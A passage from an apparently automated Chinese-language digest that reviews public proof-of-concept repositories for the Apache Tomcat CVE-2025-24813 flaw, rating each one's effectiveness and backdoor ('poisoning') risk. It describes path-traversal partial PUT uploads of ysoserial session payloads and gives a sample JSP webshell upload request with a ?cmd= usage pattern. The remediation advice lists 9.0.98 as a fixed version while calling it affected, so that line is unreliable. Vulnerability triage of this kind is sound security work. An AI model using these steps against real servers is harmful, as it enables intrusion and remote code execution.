**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
